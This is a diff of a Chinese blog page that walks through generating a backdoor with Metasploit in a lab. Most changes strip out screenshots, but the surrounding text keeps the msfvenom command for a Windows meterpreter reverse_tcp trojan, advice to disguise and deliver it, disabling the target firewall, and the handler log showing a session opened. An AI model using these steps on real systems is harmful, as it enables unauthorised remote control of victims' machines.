@@ -86,20 +86,10 @@
 <meta property="og:site_name" content="changyouB-log">
 <meta property="og:description" content="后门简介后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。但是，如果这些后门被其他人知道，或是在发布软件之前没有删除后门程序，那么它就成了安全风险，容易被黑客当成漏洞进行攻击。etasploit可以生成多种多样的后门，比如windows、linux、java、php等。  实验环境Kali linu">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/3be666cb7d594b598fd8e4046eaa1985/kali-2019-07-28-14-18-33.png">
-<meta property="og:image" content="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/f3e31271b6d84a3d8aeb54bfae7c5e11/kali-2019-07-28-14-18-33.png">
-<meta property="og:image" content="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/d9c75799d53a4f18a3e4f94ef8af9ecf/p%29la%5Drvqs%7Eeo.png">
-<meta property="og:image" content="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/412902be4c374eb9bd8089826e25295c/lip_image001.png">
-<meta property="og:image" content="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/af39adfb5998456998123b985436a180/%29%60oxcj%7E5@3jt.png">
-<meta property="og:image" content="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/123d836f10374539b156066e2f270903/%7B5%7D46%25wbx@g2.png">
-<meta property="og:image" content="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/5f8d282021084eb8b20d1596ae6fb71f/c%5B%5Dy3063%7Bgo0.png">
-<meta property="og:image" content="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/eb715146576d4be4b50eb3a166b435e9/r%5Dgeugp6vuyn.png">
-<meta property="og:image" content="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/db4f70ac13d9430db99e977fda8f967f/kali-2019-07-28-14-10-43.png">
-<meta property="og:updated_time" content="2019-08-09T10:45:36.284Z">
+<meta property="og:updated_time" content="2019-08-09T12:41:31.892Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="metasploit之后门的生成">
 <meta name="twitter:description" content="后门简介后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。但是，如果这些后门被其他人知道，或是在发布软件之前没有删除后门程序，那么它就成了安全风险，容易被黑客当成漏洞进行攻击。etasploit可以生成多种多样的后门，比如windows、linux、java、php等。  实验环境Kali linu">
-<meta name="twitter:image" content="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/3be666cb7d594b598fd8e4046eaa1985/kali-2019-07-28-14-18-33.png">
 
 
 
@@ -316,19 +306,14 @@
 <hr>
 <p>选择以下攻击载荷并生成一个exe的木马程序</p>
 <p>命令msfconsole 开启Metasploit</p>
-<p><strong><img src="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/3be666cb7d594b598fd8e4046eaa1985/kali-2019-07-28-14-18-33.png" alt="img"></strong></p>
 <p>查看payload，使用命令show payloads，msf提供了多种攻击载荷</p>
 <p>选择以下攻击载荷（使用TAB键自动补全），并生成一个exe的木马程序</p>
 <p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.128 lport=4444 -f exe -o /123.exe</p>
 <p>其中，lhost为kali linx的IP地址 生成的exe文件存放在根目录下</p>
-<p><strong><img src="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/f3e31271b6d84a3d8aeb54bfae7c5e11/kali-2019-07-28-14-18-33.png" alt="img"></strong></p>
 <hr>
 <p><strong>使用命令 cd /，可以看到我们生成的exe文件</strong></p>
-<p><strong><img src="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/d9c75799d53a4f18a3e4f94ef8af9ecf/p%29la%5Drvqs%7Eeo.png" alt="img"></strong></p>
-<p><strong><img src="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/412902be4c374eb9bd8089826e25295c/lip_image001.png" alt="img"></strong></p>
 <hr>
 <p>接下来，我们需要把生成的exe文件伪装成其他文件发送到目标机上。由于实验机环境限制，为了把我们生成的exe上传到目标机上，这里我们需要使用Putty这个工具，将生成的exe文件传到win7虚拟机上。</p>
-<p><strong><img src="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/af39adfb5998456998123b985436a180/%29%60oxcj%7E5@3jt.png" alt="img"></strong></p>
 <hr>
 <p>为了不出现连接被拒绝的情况，我们首先要在kali linux上打开ssh服务，并且关闭win7防火墙。</p>
 <p>在kali linux上打开ssh服务的方法：</p>
@@ -354,11 +339,8 @@
 <p>执行命令后都会让输入密码，直接敲回车设置为空即可</p>
 <hr>
 <p><strong>Win7关闭防火墙的方法</strong></p>
-<p><strong><img src="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/123d836f10374539b156066e2f270903/%7B5%7D46%25wbx@g2.png" alt="img"></strong></p>
 <hr>
 <p>接着打开win7上win+R输入psftp.exe，使用命令 open192.168.10.128  ，连接到kali linux，使用cd /跳转到根目录下，使用命令get 文件名把文件下载到本地。</p>
-<p><strong><img src="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/5f8d282021084eb8b20d1596ae6fb71f/c%5B%5Dy3063%7Bgo0.png" alt="img"></strong></p>
-<p><strong><img src="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/eb715146576d4be4b50eb3a166b435e9/r%5Dgeugp6vuyn.png" alt="img"></strong></p>
 <hr>
 <p>在msf中设置监听</p>
 <p>use exploit/multi/handler </p>
@@ -382,7 +364,7 @@
 <p>[*] Sending stage (179779 bytes) to 192.168.10.1</p>
 <p>[*] Sleeping before handling stage…</p>
 <p>[*] Meterpreter session 1 opened (192.168.10.128:4444 -&gt; 192.168.10.1:53292) at 2019-07-28 14:08:08 +0800</p>
-<p><strong><img src="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/db4f70ac13d9430db99e977fda8f967f/kali-2019-07-28-14-10-43.png" alt="img"></strong></p>
+<hr>
 <hr>
 <h3 id="实验结束"><a href="#实验结束" class="headerlink" title="实验结束"></a>实验结束</h3>
       
@@ -418,8 +400,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/08/09/XSS/" rel="prev" title="XSS">
-                XSS <i class="fa fa-chevron-right"></i>
+              <a href="/2019/08/09/SRC/" rel="prev" title="SRC">
+                SRC <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -499,7 +481,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
